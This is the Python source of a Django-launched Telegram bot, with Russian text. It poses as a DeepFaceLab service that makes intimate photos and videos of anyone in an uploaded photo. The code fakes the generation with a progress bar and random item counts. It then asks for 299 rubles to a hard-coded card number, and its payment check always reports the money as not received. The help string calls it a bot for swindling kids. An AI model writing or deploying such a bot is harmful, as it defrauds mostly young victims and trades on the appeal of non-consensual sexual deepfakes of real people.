from main.models import *

from asgiref.sync import sync_to_async
from rest_framework.authtoken.models import Token

import os, django, logging, warnings, uuid, time, random
warnings.filterwarnings("ignore")

from django.core.management.base import BaseCommand

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackContext,
    CallbackQueryHandler,
    ConversationHandler,
    CommandHandler,
    MessageHandler,
    filters,
)

os.environ["DJANGO_ALLOW_ASYNC_UNSAFE"] = "true"
django.setup()

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)


async def start(update: Update, context: CallbackContext):
    """
        Обработчик команды /start
    """
    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    markup = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="Выбери качество встраивания",
                    callback_data="dump_naeb",
                )
            ],
            [
                InlineKeyboardButton(
                    text="Отзывы 🌟",
                    url="https://t.me/+LZvqNEc5CUFkZmZh",
                ),
            ],
        ])

    await context.bot.send_message(
        message.chat.id,
        f"👋 Привет, <b>{message.chat.username}</b>\n\n🤖 <b>Я - нeйpoсeть, которая генерирует пpивaтные фoтo.</b>\n\n🔐 <b>Мы используем такую новейшую технологию, как DeepFaceLab, поэтому сомневаться в качестве товара не стоит!</b>\n\n🔎 <pre>Oтпрaвьтe ботy фотографию или видео, оплатите интересующий материал, а дальше дело за нами!</pre>\n\nПoддeржкa: @ushshshhs",
        parse_mode="HTML",
        reply_markup=markup
    )

    return ConversationHandler.END

async def ask_for_link(update: Update, context: CallbackContext):
    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    await context.bot.send_message(
        message.chat.id,
        "🔥 <b>Выбери один из вариантов:</b>", 
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="🤪 EAZY",
                    callback_data="search",
                )
            ],
            [
                InlineKeyboardButton(
                    text="⚡️ MIDDLE",
                    callback_data="search",
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔥 HARD",
                    callback_data="search",
                )
            ],
            [
                InlineKeyboardButton(
                    text="⏮️ В меню",
                    callback_data="menu",
                )
            ],
        ])
    )

    return 0

async def content(update: Update, context: CallbackContext):
    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    await context.bot.send_message(
        message.chat.id, 
        '<b> Отправьте фотографию человека:</b>',
        parse_mode="HTML"
        )
    
    return 1

async def search(update:Update, context: CallbackContext):
    startin_text = list("🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥")
    if update.message:
        message = update.message
    else:
        message = update.callback_query.message
    
    logging.info(message.photo[0].file_id)

    msg = await context.bot.send_message(
        message.chat.id,
            f"Выполянем генерацию... 🔎\n\n✅ Фотография в разработке\n\n⏳ Готовим материал... <b>{0}%</b>\n{''.join(startin_text)}",
            parse_mode="HTML"
    )

    for index in range(len(startin_text)):
        startin_text[index] = "🟩"
        await context.bot.edit_message_text(
            f"Выполянем генерацию... 🔎\n\n✅ Фотография в разработке\n\n⏳ Готовим материал... <b>{(index + 1) * 10}%</b>\n{''.join(startin_text)}",
            message.chat.id,
            msg.id,
            parse_mode='HTML'
        )
        time.sleep(.1)

    await context.bot.send_photo(
            chat_id=message.chat.id,
            photo=message.photo[0].file_id,
            caption=f"<b>Фотографии сгенерированы</b> ✅\n\n<b>Интим фото: </b>{random.randint(5, 30)} шт.\n<b>Интим видео: </b>{random.randint(1, 3)} шт.", 
            parse_mode="HTML", 
            reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "💰 Приобрести за 299 ₽",
                    callback_data="buy_archive"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="⏮️ В меню",
                    callback_data="menu",
                )

            ]
        ]), 
        write_timeout=5,
    )

    return 2

async def confirm_paying(update: Update, context: CallbackContext):
    code = "#" + str(uuid.uuid4().hex)[:6].upper()
    context.user_data["deal_code"] = code

    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    await context.bot.send_message(
        message.chat.id,
        f"🤩 <b>Для получения доступа:</b>\n\nПереведите <b>299₽</b> по реквизитам ниже и в комментариях укажите номер сделки. После чего нажмите кнопку 'Проверить оплату ✅'\n\n<b><u>Реквизиты:</u></b>\n<pre>2200 7008 5830 0774</pre>\n<b><u>Номер сделки:</u></b> {code}\n\n<i>Поддержка:</i> @ushshshhs",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "Проверить оплату ✅",
                    callback_data="check_payment"
                ),
            ]
        ])
    )

    return ConversationHandler.END

async def check_payment(update: Update, context:CallbackContext):
    deal_code = context.user_data.get("deal_code", "")
    
    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    msg = await context.bot.send_message(
        message.chat.id, 
        '<b>⏳ Минуточку....</b>\nПроверяем ваш платеж.',
        parse_mode='HTML'
    )
    time.sleep(5)
    await context.bot.delete_message(message.chat.id, msg.id)

    await context.bot.send_message(
        message.chat.id,
        f"😢 Оплата по сделке <b>{deal_code}</b> пока не получена.\n\n<i>*Если вы оплатили, но оплата до сих пор не прошла, пишите в поддержку.</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="⏮️ В меню",
                    callback_data="menu",
                )
            ],
            [
                InlineKeyboardButton(
                    text="⚠️ Поддержка",
                    url="https://t.me/ushshshhs",
                )
            ]
        ])
    )

async def garbage(update:Update, context:CallbackContext):
    if update.message:
        message = update.message
    else:
        message = update.callback_query.message
    
    logging.info(message)

    await context.bot.send_message(
        message.chat.id,
        f"<b>{message.chat.username}</b>, я пока не умею обрабатывать такие запросы, поэтому воспользуйтесь меню.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(
                text="⏮️ В меню",
                callback_data="menu",
            )]
        ])        
    )

def main() -> None:
    """
        Запуск бота
    """

    application = Application.builder().token(os.environ.get("NAEB_BOT_TOKEN")).build()

    application.add_handler(CommandHandler("start", start))

    naeb_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(ask_for_link, "dump_naeb",)],
        states={
            0:[CallbackQueryHandler(content, "search",)],
            1:[MessageHandler(filters.PHOTO, search)],
            2:[CallbackQueryHandler(confirm_paying, "buy_archive",)],
        },
        fallbacks=[CallbackQueryHandler(start, "menu",)]
    )
    application.add_handler(naeb_handler)
    application.add_handler(CallbackQueryHandler(start, 'menu'))
    application.add_handler(CallbackQueryHandler(check_payment, "check_payment",))
    
    
    application.add_handler(MessageHandler(filters.TEXT, garbage))
    application.run_polling()


class Command(BaseCommand):
    help = 'Команда запуска телеграм бота по обманке пиздюков'

    def handle(self, *args, **kwargs):        
        main()

        
        
        
